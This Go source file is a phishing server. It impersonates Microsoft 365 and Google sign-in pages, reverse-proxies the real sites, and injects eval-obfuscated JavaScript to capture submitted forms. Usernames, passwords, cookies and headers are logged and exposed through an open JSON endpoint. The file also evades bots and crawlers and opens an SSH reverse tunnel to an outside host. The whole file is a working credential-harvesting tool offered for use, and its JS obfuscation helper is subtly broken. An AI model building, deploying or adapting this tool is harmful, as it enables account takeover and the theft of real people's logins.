package main

import (
	"bytes"
	"crypto/tls"
	"encoding/json"
	"flag"
	"fmt"
	"io"
	"log"
	"net/http"
	"net/http/httputil"
	"net/url"
	"os/exec"
	"regexp"
	"strings"
	"sync"
	"text/template"
	"time"

	"github.com/gorilla/sessions"
	"golang.org/x/crypto/acme/autocert"
)

type CapturedData struct {
    Type      string            `json:"type"`
    Username  string            `json:"username,omitempty"`
    Password  string            `json:"password,omitempty"`
    Cookies   map[string]string `json:"cookies,omitempty"`
    Headers   http.Header       `json:"headers,omitempty"`
    URL       string            `json:"url"`
    Method    string            `json:"method"`
    Body      string            `json:"body,omitempty"`
    Timestamp time.Time         `json:"timestamp"`
    IP        string            `json:"ip"`
    UserAgent string            `json:"user_agent"`
    SessionID string            `json:"session_id,omitempty"`
}

type Phishlet struct {
    Name        string
    TargetURL   string
    Title       string
    LogoURL     string
    FormFields  []string
    JSInject    string
    CookieNames []string
}

type Config struct {
    BindAddr      string
    BackendURL    string
    PhishletName  string
    EnableSSL     bool
    DNSProvider   string
    Domain        string
    OracleHost    string
    SessionSecret string
    Obfuscate     bool
}

var (
    config       Config
    captured     []CapturedData
    mu           sync.Mutex
    store        *sessions.CookieStore
    phishlets    map[string]Phishlet
    reverseProxy *httputil.ReverseProxy
    botDetectors = []string{"bot", "crawler", "spider", "headless", "phantom"}
)

const defaultPhishletHTML = `
<!DOCTYPE html>
<html>
<head>
    <title>{{.Title}}</title>
    <script>{{.JSInject}}</script>
    <style>/* Modern phishing CSS */</style>
</head>
<body>
    <div class="login-container">
        <img src="{{.LogoURL}}" alt="Logo">
        <h1>{{.Title}}</h1>
        <form id="phishForm" method="POST">
            {{range $field := .FormFields}}
            <input type="{{$field}}" name="{{$field}}" placeholder="{{$field | title}}" required>
            {{end}}
            <button type="submit">Login</button>
        </form>
    </div>
</body>
</html>`

func init() {
    phishlets = map[string]Phishlet{
        "office365": {
            Name:        "office365",
            TargetURL:   "https://login.microsoftonline.com",
            Title:       "Microsoft - Sign In",
            LogoURL:     "//login.microsoftonline.com/favicon.ico",
            FormFields:  []string{"username", "password"},
            JSInject:    obfuscateJS(`document.addEventListener('DOMContentLoaded', function() { console.log('Phishlet loaded'); });`),
            CookieNames: []string{"MSISAAccountType"},
        },
        "gmail": {
            Name:        "gmail",
            TargetURL:   "https://accounts.google.com",
            Title:       "Google - Sign In",
            LogoURL:     "//accounts.google.com/favicon.ico",
            FormFields:  []string{"email", "password"},
            JSInject:    obfuscateJS(`setTimeout(() => { window.scrollTo(0,0); }, 100);`),
            CookieNames: []string{"NID", "SID"},
        },
    }
}

func main() {
    parseFlags()
    loadConfig()
    setupSessionStore()
    setupReverseProxy()

    log.Printf("Phishing server starting on %s (Phishlet: %s)", config.BindAddr, config.PhishletName)

    if config.EnableSSL && config.Domain != "" {
        startHTTPS()
    } else {
        startHTTP()
    }
}

func parseFlags() {
    flag.StringVar(&config.BindAddr, "bind", "0.0.0.0:8080", "Bind address")
    flag.StringVar(&config.BackendURL, "backend", "", "Backend target URL for reverse proxy")
    flag.StringVar(&config.PhishletName, "phishlet", "office365", "Phishlet name")
    flag.BoolVar(&config.EnableSSL, "ssl", true, "Enable SSL")
    flag.StringVar(&config.Domain, "domain", "", "Domain for SSL certs")
    flag.StringVar(&config.OracleHost, "oracle", "", "Oracle host for tunnel")
    flag.StringVar(&config.SessionSecret, "secret", "phish-secret-key-change-me", "Session secret")
    flag.BoolVar(&config.Obfuscate, "obfuscate", true, "Enable payload obfuscation")
    flag.Parse()
}

func loadConfig() {
    if config.BackendURL == "" {
        config.BackendURL = phishlets[config.PhishletName].TargetURL
    }
}

func setupSessionStore() {
    store = sessions.NewCookieStore([]byte(config.SessionSecret))
}

func setupReverseProxy() {
    target, _ := url.Parse(config.BackendURL)
    reverseProxy = httputil.NewSingleHostReverseProxy(target)

    // URL Rewriter
    originalDirector := reverseProxy.Director
    reverseProxy.Director = func(req *http.Request) {
        originalDirector(req)
        req.Host = target.Host
        req.Header.Set("X-Forwarded-Host", req.Header.Get("Host"))
    }

    // Modify Response for injection
    originalModifyResponse := reverseProxy.ModifyResponse
    reverseProxy.ModifyResponse = func(resp *http.Response) error {
        if originalModifyResponse != nil {
            originalModifyResponse(resp)
        }
        injectJS(resp)
        return nil
    }
}

func startHTTP() {
    http.HandleFunc("/", handlePhishlet)
    http.HandleFunc("/login", handleCapture)
    http.HandleFunc("/api/captured", handleCapturedAPI)
    http.HandleFunc("/proxy/", proxyHandler)
    http.HandleFunc("/tunnel", handleOracleTunnel)

    log.Fatal(http.ListenAndServe(config.BindAddr, nil))
}

func startHTTPS() {
    m := autocert.Manager{
        Cache:      autocert.DirCache("certs"),
        Prompt:     autocert.AcceptTOS,
        HostPolicy: autocert.HostWhitelist(config.Domain),
    }

    srv := &http.Server{
        Addr:      config.BindAddr,
        TLSConfig: &tls.Config{GetCertificate: m.GetCertificate},
    }

    log.Fatal(srv.ListenAndServeTLS("", ""))
}

func handlePhishlet(w http.ResponseWriter, r *http.Request) {
    phishlet := phishlets[config.PhishletName]

    tmpl := template.Must(template.New("phishlet").Parse(defaultPhishletHTML))
    data := struct {
        Title      string
        LogoURL    string
        FormFields []string
        JSInject   string
    }{
        Title:      phishlet.Title,
        LogoURL:    phishlet.LogoURL,
        FormFields: phishlet.FormFields,
        JSInject:   phishlet.JSInject,
    }

    w.Header().Set("Content-Security-Policy", "default-src 'unsafe-inline' 'unsafe-eval' * data: blob:; img-src * data: blob:;")
    tmpl.Execute(w, data)
}

func handleCapture(w http.ResponseWriter, r *http.Request) {
    if r.Method == "POST" {
        captureCredentials(r)
    }

    // Redirect to proxy
    http.Redirect(w, r, "/proxy/"+r.URL.Path, http.StatusSeeOther)
}

func proxyHandler(w http.ResponseWriter, r *http.Request) {
    if isBot(r) {
        log.Printf("Bot detected: %s", r.RemoteAddr)
        http.Error(w, "Access denied", http.StatusForbidden)
        return
    }

    reverseProxy.ServeHTTP(w, r)
}

func handleCapturedAPI(w http.ResponseWriter, r *http.Request) {
    w.Header().Set("Content-Type", "application/json")
    mu.Lock()
    json.NewEncoder(w).Encode(captured)
    mu.Unlock()
}

func handleOracleTunnel(w http.ResponseWriter, r *http.Request) {
    if config.OracleHost == "" {
        http.Error(w, "Oracle host not configured", http.StatusBadRequest)
        return
    }

    // Reverse tunnel to Oracle host
    go func() {
        cmd := exec.Command("ssh", "-R", "8080:localhost:8080", "-N", config.OracleHost)
        cmd.Start()
        log.Printf("Tunnel established to %s", config.OracleHost)
    }()

    w.Write([]byte("Tunnel started"))
}

func captureCredentials(r *http.Request) {
    session, _ := store.Get(r, "phish-session")

    data := CapturedData{
        Type:      "credential",
        Username:  r.FormValue("username"),
        Password:  r.FormValue("password"),
        Cookies:   parseCookies(r),
        Headers:   r.Header,
        URL:       r.URL.String(),
        Method:    r.Method,
        Body:      readBody(r),
        Timestamp: time.Now(),
        IP:        r.RemoteAddr,
        UserAgent: r.UserAgent(),
        SessionID: session.ID,
    }

    mu.Lock()
    captured = append(captured, data)
    mu.Unlock()

    log.Printf("CAPTURED: %s:%s from %s", data.Username, data.Password, data.IP)
}

func parseCookies(r *http.Request) map[string]string {
    cookies := make(map[string]string)
    for _, c := range r.Cookies() {
        cookies[c.Name] = c.Value
    }
    return cookies
}

func readBody(r *http.Request) string {
    if r.Body == nil {
        return ""
    }
    body, _ := io.ReadAll(r.Body)
    return string(body)
}

func injectJS(resp *http.Response) {
    if resp == nil || resp.Body == nil {
        return
    }

    body, err := io.ReadAll(resp.Body)
    if err != nil {
        return
    }

    // Inject credential capture JS
    js := obfuscateJS(`
        document.addEventListener('submit', function(e) {
            var formData = new FormData(e.target);
            fetch('/login', {method: 'POST', body: formData});
        });
    `)

    injected := regexp.MustCompile(`(?i)</body>`).ReplaceAll(body, []byte(js+"</body>"))

    resp.Body = io.NopCloser(bytes.NewReader(injected))
    resp.ContentLength = int64(len(injected))
    resp.Header.Set("Content-Length", fmt.Sprintf("%d", len(injected)))
}

func obfuscateJS(js string) string {
    if !config.Obfuscate {
        return js
    }
    // Simple JS obfuscation
    var sb strings.Builder
    sb.WriteString("eval(")
    for _, c := range js {
        sb.WriteString(fmt.Sprintf("String.fromCharCode(%d)", c))
    }
    sb.WriteString(")")
    return sb.String()
}

func isBot(r *http.Request) bool {
    ua := strings.ToLower(r.UserAgent())
    for _, detector := range botDetectors {
        if strings.Contains(ua, detector) {
            return true
        }
    }
    return false
}

func urlRewriter(req *http.Request) {
    // Rewrite URLs to proxy path
    req.URL.Path = strings.ReplaceAll(req.URL.Path, config.BackendURL, "/proxy/")
}